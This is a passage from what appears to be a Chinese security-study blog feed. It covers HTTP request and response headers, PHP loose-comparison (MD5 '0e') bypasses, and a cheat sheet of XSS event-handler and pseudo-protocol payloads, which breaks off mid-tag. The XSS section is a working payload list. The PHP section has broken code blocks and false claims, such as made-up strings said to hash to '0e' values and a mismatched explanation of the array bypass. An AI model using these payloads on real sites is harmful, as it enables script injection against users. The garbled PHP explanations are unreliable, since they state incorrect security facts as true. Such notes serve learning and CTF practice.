    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP请求头</title>
    <link href="/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/"/>
    <url>/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP请求头"><a href="#HTTP请求头" class="headerlink" title="HTTP请求头"></a>HTTP请求头</h1><h2 id="HTTP请求头组成"><a href="#HTTP请求头组成" class="headerlink" title="HTTP请求头组成"></a>HTTP请求头组成</h2><p>HTTP请求头提供了关于请求，响应或者其他的发送实体的信息。HTTP的头信息包括通用头、请求头、响应头和实体头四个部分。每个头域由一个域名，冒号（:）和域值三部分组成。</p><p>四个部分</p><ul><li>通用头标：即可用于请求，也可用于响应，是作为一个整体而不是特定资源与事务相关联。</li><li>请求头标：允许客户端传递关于自身的信息和希望的响应形式。</li><li>响应头标：服务器和于传递自身信息的响应。</li><li>实体头标：定义被传送资源的信息。即可用于请求，也可用于响应。</li></ul><h2 id="常用的Header"><a href="#常用的Header" class="headerlink" title="常用的Header"></a>常用的Header</h2><h3 id="1、首先最常用的：Accept：它的作用是：客户端接收的数据格式；"><a href="#1、首先最常用的：Accept：它的作用是：客户端接收的数据格式；" class="headerlink" title="1、首先最常用的：Accept：它的作用是：客户端接收的数据格式；"></a>1、首先最常用的：Accept：它的作用是：客户端接收的数据格式；</h3><p>比方说你的参数值填写的是<strong>application&#x2F;json</strong>，就说明浏览器所接收的数据是<strong>json</strong>类型的数据，当你加了Accept请求头之后，你会发现<strong>你得到的数据</strong>和你<strong>没有加Accept请求头的数据</strong>是完全不一样的。如果你没有加Accept这个请求头，你得到的数据可能就是一个简单的网页。Accept它可以影响你返回的数据。</p><p><img src="/.com//image-20250410002930-dkix7sg.png" alt="image"></p><h3 id="2、X-Requested-With：它的作用是：异步请求；"><a href="#2、X-Requested-With：它的作用是：异步请求；" class="headerlink" title="2、X-Requested-With：它的作用是：异步请求；"></a>2、X-Requested-With：它的作用是：异步请求；</h3><p>如果对开发有一定的了解的话，前端里面有这样一个技术<strong>Ajax</strong>异步请求。现在很多的功能都会用到这个异步请求，比如说登录。</p><p>简单的举个列子：如果现在你想去上海，只有一条路的话，你只能走唯一的一条路。那么如果有两条路或者多条路，可以坐飞机，高铁，汽车等等。那么它们就相当于异步，也就是说你可以通过飞机到上海，也可以坐高铁到上海，这样通俗的理解异步请求。</p><p>异步请求的特点：无刷新。就是说登录的时候是需要进行页面跳转的，而异步请求它不需要跳转也可以做到这样的请求。</p><h3 id="3、User-Aget：它的作用是：发送请求的客户端的类型；"><a href="#3、User-Aget：它的作用是：发送请求的客户端的类型；" class="headerlink" title="3、User-Aget：它的作用是：发送请求的客户端的类型；"></a>3、User-Aget：它的作用是：发送请求的客户端的类型；</h3><p>比方说我们可以通过postman去发送请求类型，也可以通过浏览器去发送请求等等，那么有的接口你通过非浏览器去请求它是无法通过的。</p><h3 id="4、Content-type：它的作用是：请求的报文格式；"><a href="#4、Content-type：它的作用是：请求的报文格式；" class="headerlink" title="4、Content-type：它的作用是：请求的报文格式；"></a>4、Content-type：它的作用是：请求的报文格式；</h3><p><img src="/.com//image-20250410002956-9rw475z.png" alt="image"></p><h3 id="5、Cookie：Cookie信息；"><a href="#5、Cookie：Cookie信息；" class="headerlink" title="5、Cookie：Cookie信息；"></a>5、Cookie：Cookie信息；</h3><p>有的接口需要登录之后才会生成Cookie信息，必须要保持登录的状态。这种情况我们就需要对Cookie信息进行管理。</p><p><img src="/.com//image-20250410003007-2dtyxzw.png" alt="image"></p><h2 id="HTTP-Request-Header-请求头"><a href="#HTTP-Request-Header-请求头" class="headerlink" title="HTTP Request Header 请求头"></a>HTTP Request Header 请求头</h2><blockquote><p><strong>Accept：</strong> 指定客户端能够接收的内容类型。</p><p><strong>Accept-Charset：</strong> 浏览器可以接受的字符编码集。</p><p><strong>Accept-Encoding：</strong> 指定浏览器可以支持的web服务器返回内容压缩编码类型。</p><p><strong>Accept-Language：</strong> 浏览器可接受的语言。</p><p><strong>Accept-Ranges：</strong> 可以请求网页实体的一个或者多个子范围字段。</p><p><strong>AuthorizationHTTP：</strong> 授权的授权证书。</p><p><strong>Cache-Control：</strong> 指定请求和响应遵循的缓存机制。</p><p><strong>Connection：</strong> 表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</p><p><strong>CookieHTTP：</strong> 请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</p><p><strong>Content-Length：</strong> 请求的内容长度。</p><p><strong>Content-Type：</strong> 请求的与实体对应的MIME信息。</p><p><strong>Date：</strong> 请求发送的日期和时间。</p><p><strong>Expect：</strong> 请求的特定的服务器行为。</p><p><strong>From：</strong> 发出请求的用户的Email。</p><p><strong>Host：</strong> 指定请求的服务器的域名和端口号。</p><p><strong>If-Match：</strong> 只有请求内容与实体相匹配才有效。</p><p><strong>If-Modified-Since：</strong> 如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码。</p><p><strong>If-None-Match：</strong> 如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变。</p><p><strong>If-Range：</strong> 如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。</p><p><strong>If-Unmodified-Since：</strong> 只在实体在指定时间之后未被修改才请求成功。</p><p><strong>Max-Forwards：</strong> 限制信息通过代理和网关传送的时间。</p><p><strong>Pragma：</strong> 用来包含实现特定的指令。</p><p><strong>Proxy-Authorization：</strong> 连接到代理的授权证书。</p><p><strong>Range：</strong> 只请求实体的一部分，指定范围。</p><p><strong>Referer：</strong> 先前网页的地址，当前请求网页紧随其后,即来路。</p><p><strong>TE：</strong> 客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息。</p><p><strong>Upgrade：</strong> 向服务器指定某种传输协议以便服务器进行转换（如果支持。</p><p><strong>User-AgentUser-Agent：</strong> 的内容包含发出请求的用户信息。</p><p><strong>Via：</strong> 通知中间网关或代理服务器地址，通信协议。</p><p><strong>Warning：</strong> 关于消息实体的警告信息</p></blockquote><h2 id="HTTP-Responses-Header-响应头"><a href="#HTTP-Responses-Header-响应头" class="headerlink" title="HTTP Responses Header 响应头"></a>HTTP Responses Header 响应头</h2><blockquote><p><strong>Accept-Ranges：</strong> 表明服务器是否支持指定范围请求及哪种类型的分段请求。</p><p><strong>Age：</strong> 从原始服务器到代理缓存形成的估算时间（以秒计，非负）。</p><p><strong>Allow：</strong> 对某网络资源的有效的请求行为，不允许则返回405。</p><p><strong>Cache-Control：</strong> 告诉所有的缓存机制是否可以缓存及哪种类型。</p><p><strong>Content-Encodingweb：</strong> 服务器支持的返回内容压缩编码类型。。</p><p><strong>Content-Language：</strong> 响应体的语言。</p><p><strong>Content-Length：</strong> 响应体的长度。</p><p><strong>Content-Location：</strong> 请求资源可替代的备用的另一地址。</p><p><strong>Content-MD5：</strong> 返回资源的MD5校验值。</p><p><strong>Content-Range：</strong> 在整个返回体中本部分的字节位置。</p><p><strong>Content-Type：</strong> 返回内容的MIME类型。</p><p><strong>Date：</strong> 原始服务器消息发出的时间。</p><p><strong>ETag：</strong> 请求变量的实体标签的当前值。</p><p><strong>Expires：</strong> 响应过期的日期和时间。</p><p><strong>Last-Modified：</strong> 请求资源的最后修改时间。</p><p><strong>Location：</strong> 用来重定向接收方到非请求URL的位置来完成请求或标识新的资源。</p><p><strong>Pragma：</strong> 包括实现特定的指令，它可应用到响应链上的任何接收方。</p><p><strong>Proxy-Authenticate：</strong> 它指出认证方案和可应用到代理的该URL上的参数。</p><p><strong>refresh：</strong> 应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持）</p><p><strong>Retry-After：</strong> 如果实体暂时不可取，通知客户端在指定时间之后再次尝试。</p><p><strong>Serverweb：</strong> 服务器软件名称。</p><p><strong>Set-Cookie：</strong> 设置Http Cookie。</p><p><strong>Trailer：</strong> 指出头域在分块传输编码的尾部存在。</p><p><strong>Transfer-Encoding：</strong> 文件传输编码。</p><p><strong>Vary：</strong> 告诉下游代理是使用缓存响应还是从原始服务器请求。</p><p><strong>Via：</strong> 告知代理客户端响应是通过哪里发送的。</p><p><strong>Warning：</strong> 警告实体可能存在的问题。</p><p><strong>WWW-Authenticate：</strong> 表明客户端请求实体应该使用的授权方案。</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>HTTP教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTTP请求头</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP响应头信息</title>
    <link href="/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4%E4%BF%A1%E6%81%AF/"/>
    <url>/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP响应头信息"><a href="#HTTP响应头信息" class="headerlink" title="HTTP响应头信息"></a>HTTP响应头信息</h1><p>HTTP 响应头信息是服务器在响应客户端的HTTP请求时发送的一系列头字段，它们提供了关于响应的附加信息和服务器的指令。</p><p>以下是一些常见的 HTTP 响应头信息：</p><table><thead><tr><th>响应头信息（英文）</th><th>响应头信息（中文）</th><th>描述</th></tr></thead><tbody><tr><td>Date</td><td>日期</td><td>响应生成的日期和时间。例如：Wed, 18 Apr 2024 12:00:00 GMT</td></tr><tr><td>Server</td><td>服务器</td><td>服务器软件的名称和版本。例如：Apache&#x2F;2.4.1 (Unix)</td></tr><tr><td>Content-Type</td><td>内容类型</td><td>响应体的媒体类型（MIME类型），如<code>text/html; charset=UTF-8</code>​, <code>application/json</code>​等。</td></tr><tr><td>Content-Length</td><td>内容长度</td><td>响应体的大小，单位是字节。例如：3145</td></tr><tr><td>Content-Encoding</td><td>内容编码</td><td>响应体的压缩编码，如 <code>gzip</code>​, <code>deflate</code>​等。</td></tr><tr><td>Content-Language</td><td>内容语言</td><td>响应体的语言。例如：zh-CN</td></tr><tr><td>Content-Location</td><td>内容位置</td><td>响应体的 URI。例如：&#x2F;index.html</td></tr><tr><td>Content-Range</td><td>内容范围</td><td>响应体的字节范围，用于分块传输。例如：bytes 0-999&#x2F;8000</td></tr><tr><td>Cache-Control</td><td>缓存控制</td><td>控制响应的缓存行为, 如 no-cache 表示必须重新请求。</td></tr><tr><td>Connection</td><td>连接</td><td>管理连接的选项，如<code>keep-alive</code>​或<code>close</code>​，keep-alive 表示连接不会在传输后关闭。。</td></tr><tr><td>Set-Cookie</td><td>设置 Cookie</td><td>设置客户端的 cookie。例如：sessionId=abc123; Path=&#x2F;; Secure</td></tr><tr><td>Expires</td><td>过期时间</td><td>响应体的过期日期和时间。例如：Thu, 18 Apr 2024 12:00:00 GMT</td></tr><tr><td>Last-Modified</td><td>最后修改时间</td><td>资源最后被修改的日期和时间。例如：Wed, 18 Apr 2024 11:00:00 GMT</td></tr><tr><td>ETag</td><td>实体标签</td><td>资源的特定版本的标识符。例如：”33a64df551425fcc55e6”</td></tr><tr><td>Location</td><td>位置</td><td>用于重定向的 URI。例如：&#x2F;newresource</td></tr><tr><td>Pragma</td><td>实现特定的指令</td><td>包含实现特定的指令，如 <code>no-cache</code>​。</td></tr><tr><td>WWW-Authenticate</td><td>认证信息</td><td>认证信息，通常用于HTTP认证。例如：Basic realm=“Access to the site”</td></tr><tr><td>Accept-Ranges</td><td>接受范围</td><td>指定可接受的请求范围类型。例如：bytes</td></tr><tr><td>Age</td><td>经过时间</td><td>响应生成后经过的秒数，从原始服务器生成到代理服务器。例如：24</td></tr><tr><td>Allow</td><td>允许方法</td><td>列出资源允许的 HTTP 方法 。例如：GET, POST，HEAD等</td></tr><tr><td>Vary</td><td>变化</td><td>告诉下游代理如何使用响应头信息来确定响应是否可以从缓存中获取。例如：Accept</td></tr><tr><td>Strict-Transport-Security</td><td>严格传输安全</td><td>指示浏览器仅通过 HTTPS 与服务器通信。例如：max-age=31536000; includeSubDomains</td></tr><tr><td>X-Frame-Options</td><td>框架选项</td><td>控制页面是否允许在框架中显示，防止点击劫持攻击。例如：SAMEORIGIN</td></tr><tr><td>X-Content-Type-Options</td><td>内容类型选项</td><td>指示浏览器不要尝试猜测资源的 MIME 类型。例如：nosniff</td></tr><tr><td>X-XSS-Protection</td><td>XSS保护</td><td>控制浏览器的 XSS 过滤和阻断。例如：1; mode=block</td></tr><tr><td>Public-Key-Pins</td><td>公钥固定</td><td>HTTP 头信息，用于HTTP公共密钥固定（HPKP），一种安全机制，用于防止中间人攻击。例如：pin-sha256=“base64+primarykey”; pin-sha256=“base64+backupkey”; max-age=expireTime</td></tr></tbody></table><p>这些响应头信息在实际的 HTTP 响应中可能会有所不同，具体值取决于服务器的配置和处理逻辑。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>HTTP教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTTP响应头信息</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>弱比较</title>
    <link href="/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%B1%E6%AF%94%E8%BE%83/"/>
    <url>/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%B1%E6%AF%94%E8%BE%83/</url>
    
    <content type="html"><![CDATA[<h1 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h1><h3 id="1-MD5-碰撞攻击"><a href="#1-MD5-碰撞攻击" class="headerlink" title="1. MD5 碰撞攻击"></a>1. <strong>MD5 碰撞攻击</strong></h3><ul><li><strong>原理</strong>: MD5 算法存在碰撞漏洞，即两个不同的输入可以生成相同的 MD5 哈希值。</li><li><strong>示例</strong>:</li><li><pre><code class="language-php">$x = &quot;240610708&quot;;$y = &quot;QNKCDZO&quot;;<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>  这两个字符串的 MD5 哈希值都是 `0e830400451993494058024219903391`​，因此 `md5($x) == md5($y)`​ 会返回 `true`​。<br><br>### <span class="hljs-number">2</span>. **科学计数法绕过**<br><br><span class="hljs-title">- **原理**:</span> PHP 在比较字符串时，如果字符串以 `0e`​ 开头，并且后面都是数字，PHP 会将其解释为科学计数法表示的浮点数 `0`​。因此，如果两个字符串的 MD5 哈希值都以 `0e`​ 开头，并且后面都是数字，它们会被认为是相等的。<br><span class="hljs-title">- **示例**:</span><br>- ```php<br>  $x = <span class="hljs-string">&quot;240610708&quot;</span><span class="hljs-comment">;</span><br>  $y = <span class="hljs-string">&quot;QNKCDZO&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>如上所述，这两个字符串的 MD5 哈希值都是 `0e830400451993494058024219903391`​，PHP 会认为它们相等。</code></pre></li></ul><h3 id="3-空字符串绕过"><a href="#3-空字符串绕过" class="headerlink" title="3. 空字符串绕过"></a>3. <strong>空字符串绕过</strong></h3><ul><li><strong>原理</strong>: 空字符串的 MD5 哈希值是 <code>d41d8cd98f00b204e9800998ecf8427e</code>​，但如果输入为空字符串，某些情况下可能会被忽略或处理为相同的值。</li><li><strong>示例</strong>:</li><li><pre><code class="language-php">$x = &quot;&quot;;$y = &quot;&quot;;<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>  这种情况下，`md5($x) == md5($y)`​ 显然为 `true`​。<br><br>### <span class="hljs-number">4</span>. **大小写不敏感**<br><br><span class="hljs-title">- **原理**:</span> 如果代码中使用了不区分大小写的比较（如 `strcasecmp`​ 或 `==`​），可能会绕过某些检查。<br><span class="hljs-title">- **示例**:</span><br>- ```php<br>  $x = <span class="hljs-string">&quot;abc&quot;</span><span class="hljs-comment">;</span><br>  $y = <span class="hljs-string">&quot;ABC&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>如果使用 `strcasecmp(md5($x), md5($y)) == 0`​，则可能会绕过检查。</code></pre></li></ul><h3 id="5-特殊字符处理"><a href="#5-特殊字符处理" class="headerlink" title="5. 特殊字符处理"></a>5. <strong>特殊字符处理</strong></h3><ul><li><strong>原理</strong>: 某些特殊字符在输入时可能会被处理为相同的值，尤其是在 URL 编码或解码过程中。</li><li><strong>示例</strong>:</li><li><pre><code class="language-php">$x = &quot;%00&quot;;$y = &quot;&quot;;<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>  在某些情况下，<span class="hljs-code">`%00`</span>​ 可能会被解释为空字符串，从而导致 <span class="hljs-code">`md5($x) == md5($y)`</span>​ 为 <span class="hljs-code">`true`</span>​。<br><br><span class="hljs-section">### 6. <span class="hljs-strong">**时间戳或随机数绕过**</span></span><br><br><span class="hljs-bullet">-</span> <span class="hljs-strong">**原理**</span>: 如果输入是基于时间戳或随机数生成的，可能在某些情况下生成相同的 MD5 哈希值。<br><span class="hljs-bullet">-</span> <span class="hljs-strong">**示例**</span>:<br><span class="hljs-bullet">-</span> <span class="hljs-code">```php</span><br><span class="hljs-code">  $x = time();</span><br><span class="hljs-code">  $y = time() - 1;</span><br></code></pre></td></tr></table></figure>虽然这种情况比较罕见，但在某些特定情况下可能会发生。</code></pre></li></ul><h3 id="7-利用-PHP-的松散比较"><a href="#7-利用-PHP-的松散比较" class="headerlink" title="7. 利用 PHP 的松散比较"></a>7. <strong>利用 PHP 的松散比较</strong></h3><ul><li><strong>原理</strong>: PHP 中的 <code>==</code>​ 是松散比较，会进行类型转换。如果两个字符串的 MD5 哈希值在类型转换后相等，<code>==</code>​ 会返回 <code>true</code>​。</li><li><strong>示例</strong>:</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$x</span> = <span class="hljs-string">&quot;0e123456789abcdef&quot;</span>;<br><span class="hljs-variable">$y</span> = <span class="hljs-string">&quot;0e987654321fedcba&quot;</span>;<br></code></pre></td></tr></table></figure><p>这两个字符串的 MD5 哈希值都以 <code>0e</code>​ 开头，PHP 会认为它们相等。</p><h3 id="8-数组绕过"><a href="#8-数组绕过" class="headerlink" title="8. 数组绕过"></a>8. 数组绕过</h3><ul><li><strong>原理</strong>: PHP 中的 <code>==</code>​ 是松散比较，会进行类型转换。如果两个字符串的 MD5 哈希值在类型转换后相等，<code>==</code>​ 会返回 <code>true</code>​。</li><li><strong>示例</strong>:</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?x[]=<span class="hljs-number">1</span>&amp;y[]=<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>这两个字符串的 MD5 哈希值都以 <code>0e</code>​ 开头，PHP 会认为它们相等。</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>PHP比较漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>弱比较</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS常见的触发标签</title>
    <link href="/2025/05/20/Web/XSS/XSS%E5%B8%B8%E8%A7%81%E7%9A%84%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE/"/>
    <url>/2025/05/20/Web/XSS/XSS%E5%B8%B8%E8%A7%81%E7%9A%84%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS常见的触发标签"><a href="#XSS常见的触发标签" class="headerlink" title="XSS常见的触发标签"></a>XSS常见的触发标签</h1><h3 id="过滤情况"><a href="#过滤情况" class="headerlink" title="过滤情况"></a>过滤情况</h3><h4 id="​​"><a href="#​​" class="headerlink" title="​&lt;script&gt;​"></a>​<code>&lt;script&gt;</code>​</h4><blockquote><p>​<code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>​</p></blockquote><h4 id="​​-1"><a href="#​​-1" class="headerlink" title="​&lt;img&gt;​"></a>​<code>&lt;img&gt;</code>​</h4><blockquote><p>图片加载错误时触发<br>​<code>&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</code>​<br>​<code>&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;</code>​<br>鼠标指针移动到元素时触发<br>​<code>&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;</code>​<br>鼠标指针移出时触发<br>​<code>&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</code>​</p></blockquote><h4 id="​​-2"><a href="#​​-2" class="headerlink" title="​&lt;a&gt;​"></a>​<code>&lt;a&gt;</code>​</h4><blockquote><p><a href="https://www.qq.com">qq</a><br>&lt;a href&#x3D;javascript:alert(‘xss’)&gt;test<br><a href="javascript:a" onmouseover="alert(/xss/)">aa</a><br>&lt;a href&#x3D;”” onclick&#x3D;alert(‘xss’)&gt;a<br>&lt;a href&#x3D;”” onclick&#x3D;eval(alert(‘xss’))&gt;aa<br>&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000 onmouseover&#x3D;prompt(‘xss’) y&#x3D;2016&gt;aa</p></blockquote><h4 id="​​-3"><a href="#​​-3" class="headerlink" title="​&lt;input&gt;​"></a>​<code>&lt;input&gt;</code>​</h4><blockquote><p>​<code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt;</code>​<br>竞争焦点，从而触发onblur事件<br>​<code>&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</code>​<br>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>​<code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;</code>​<br>​<code>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;</code>​<br>​<code>&lt;input value=&quot;&quot; onclick=alert(&#39;xss&#39;) type=&quot;text&quot;&gt;</code>​<br>​<code>&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#39;xss&#39;) bad=&quot;&quot;&gt;</code>​<br>​<code>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>​<br>按下按键时触发<br>​<code>&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;</code>​<br>按下按键时触发<br>​<code>&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;</code>​<br>松开按键式时触发<br>​<code>&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</code>​</p></blockquote><h4 id="​​-4"><a href="#​​-4" class="headerlink" title="​&lt;from&gt;​"></a>​<code>&lt;from&gt;</code>​</h4><blockquote><p>​&#96;&lt;form action&#x3D;javascript:alert(‘xss’) method&#x3D;”get”&gt;</p><form action="javascript:alert('xss')">`​  ​`<form method="post" action="aa.asp?" onmouseover="prompt('xss')"><form method="post" action="aa.asp?" onmouseover="alert('xss')"><form action="1" onmouseover="alert('xss)">`​  ​`<form method="post" action="data:text/html;base64,<script>alert('xss')</script>">`​  ​`<form method="post" action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">`​</form></form></form></form></form></form></blockquote><h4 id="​​-5"><a href="#​​-5" class="headerlink" title="​&lt;iframe&gt;​"></a>​<code>&lt;iframe&gt;</code>​</h4><blockquote><p>​&#96; &lt;iframe onload&#x3D;alert(“xss”);&gt;</p><iframe src="javascript:alert('xss')"></iframe><iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe><iframe src="data:text/html;base64,<script>alert('xss')</script>"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="><iframe src="aaa" onmouseover="alert('xss')"><iframe><iframe src="javascript&colon;prompt&lpar;``xss``&rpar;"></iframe>(‍````只有两个``) `​</iframe></iframe></iframe></iframe></blockquote><h4 id="​​-6"><a href="#​​-6" class="headerlink" title="​&lt;svg&gt;​"></a>​<code>&lt;svg&gt;</code>​</h4><blockquote><p>​<code>&lt;svg onload=alert(1)&gt;</code>​</p></blockquote><h4 id="​​-7"><a href="#​​-7" class="headerlink" title="​&lt;body&gt;​"></a>​<code>&lt;body&gt;</code>​</h4><blockquote><p>​<code>&lt;body onload=&quot;alert(1)&quot;&gt;</code>​<br>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发<br>​<code>&lt;body onscroll=alert(&quot;xss&quot;);&gt;</code>​</p><p>​<code>&lt;input autofocus&gt;</code>​</p></blockquote><h4 id="​​-8"><a href="#​​-8" class="headerlink" title="​&lt;button&gt;​"></a>​<code>&lt;button&gt;</code>​</h4><blockquote><p>元素上点击鼠标时触发<br> <code>&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;</code>​</p></blockquote><h4 id="​​-9"><a href="#​​-9" class="headerlink" title="​&lt;p&gt;​"></a>​<code>&lt;p&gt;</code>​</h4><blockquote><p>元素上按下鼠标时触发<br> <code>&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code>​<br> 元素上释放鼠标时触发<br> <code>&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code>​</p></blockquote><h4 id="​​-10"><a href="#​​-10" class="headerlink" title="​&lt;details&gt;​"></a>​<code>&lt;details&gt;</code>​</h4><blockquote><p>​<code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;</code>​<br>使用open属性触发ontoggle事件，无需用户去触发<br>​<code>&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;</code>​</p></blockquote><h4 id="​​-11"><a href="#​​-11" class="headerlink" title="​&lt;select&gt;​"></a>​<code>&lt;select&gt;</code>​</h4><blockquote><p>​<code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</code>​<br>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>​<code>&lt;select onfocus=alert(1) autofocus&gt;</code>​</p></blockquote><h4 id="​​-12"><a href="#​​-12" class="headerlink" title="​&lt;video&gt;​"></a>​<code>&lt;video&gt;</code>​</h4><blockquote><p>​<code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</code>​</p></blockquote><h4 id="​​-13"><a href="#​​-13" class="headerlink" title="​&lt;audio&gt;​"></a>​<code>&lt;audio&gt;</code>​</h4><blockquote><p>​<code>&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt;</code>​</p></blockquote><h4 id="​​-14"><a href="#​​-14" class="headerlink" title="​&lt;textarea&gt;​"></a>​<code>&lt;textarea&gt;</code>​</h4><blockquote><p>​<code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</code>​</p></blockquote><h4 id="​​-15"><a href="#​​-15" class="headerlink" title="​&lt;keygen&gt;​"></a>​<code>&lt;keygen&gt;</code>​</h4><blockquote><p>​<code>&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</code>​</p></blockquote><h4 id="​​-16"><a href="#​​-16" class="headerlink" title="​&lt;marquee&gt;​"></a>​<code>&lt;marquee&gt;</code>​</h4><blockquote><p>​<code>&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</code>​</p></blockquote><h4 id="​​-17"><a href="#​​-17" class="headerlink" title="​&lt;isindex&gt;​"></a>​<code>&lt;isindex&gt;</code>​</h4><blockquote><p>​<code>&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</code>​</p></blockquote><h4 id="​​利用link远程包含js文件​​"><a href="#​​利用link远程包含js文件​​" class="headerlink" title="​​利用link远程包含js文件​​"></a>​<strong>​<code>利用link远程包含js文件</code>​</strong>​</h4><blockquote><p>在无CSP的情况下才可以<br> <code>&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</code>​</p></blockquote><h4 id="​javascript伪协议​"><a href="#​javascript伪协议​" class="headerlink" title="​javascript伪协议​"></a>​<code>javascript伪协议</code>​</h4><blockquote><p>​&#96;<a>标签<br><a href="javascript:alert('xss');">xss</a></a></p><iframe>标签<iframe src="javascript:alert('xss');"></iframe><img>标签<img src="/.com//javascript:alert('xss')">//IE7以下<form>标签<form action="Javascript:alert(1)"><input type="submit">`​</form></form></iframe></blockquote><h4 id="​expression属性​"><a href="#​expression属性​" class="headerlink" title="​expression属性​"></a>​<code>expression属性</code>​</h4><blockquote><p>​&#96;<img 